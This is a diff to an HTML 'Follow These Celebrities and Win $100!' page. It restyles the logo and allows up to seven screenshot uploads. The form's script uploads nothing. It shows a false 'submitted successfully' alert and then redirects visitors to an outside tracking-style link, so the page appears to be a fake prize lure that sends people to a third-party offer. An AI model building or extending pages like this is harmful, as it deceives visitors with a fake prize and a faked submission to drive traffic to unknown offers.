@@ -16,33 +16,31 @@
         }
         /* Logo Styles */
         .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ff6f00;
-            margin-bottom: 20px;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff6f00, #ff4500);
             display: flex;
             align-items: center;
             justify-content: center;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 0 auto 20px;
+            flex-direction: column;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
         }
         .logo .icon {
-            background: linear-gradient(90deg, #ff6f00, #ff4500);
-            color: white;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            margin-right: 10px;
+            font-size: 24px;
+            margin-bottom: 4px;
         }
         /* Main Heading */
         h1 {
-            color: #d4af37; /* Soft gold for a professional look */
+            color: #d4af37;
             margin-bottom: 20px;
         }
         p {
-            color: #ccc; /* Light gray for a soft, readable appearance */
+            color: #ccc;
         }
         .celebrity-item {
             display: flex;
@@ -140,7 +138,7 @@
         <div class="icon">
             <i class="fas fa-star"></i>
         </div>
-        Follow Celebrities & Win $100
+        Win $100
     </div>
 
     <h1>Follow These Celebrities and Win $100!</h1>
@@ -192,17 +190,25 @@
     </div>
 
     <form id="submissionForm">
-        <label for="screenshot">Upload your screenshot:</label>
+        <label for="screenshot">Upload your screenshots (up to 7):</label>
         <div id="screenshot-box">
-            <input type="file" id="screenshot" name="screenshot" accept="image/*" required>
+            <input type="file" id="screenshot" name="screenshot" accept="image/*" multiple required>
         </div>
         <button type="submit" class="submit-button">Submit</button>
     </form>
 
     <script>
         document.getElementById("submissionForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            alert("Screenshot submitted successfully!");
+            const fileInput = document.getElementById("screenshot");
+            const files = fileInput.files;
+
+            if (files.length > 7) {
+                alert("Please select a maximum of 7 screenshots.");
+                event.preventDefault();
+                return;
+            }
+
+            alert("Screenshots submitted successfully!");
             window.location.href = "http://xportbox.com/XU/VI?nox=7277082848";
         });
     </script>
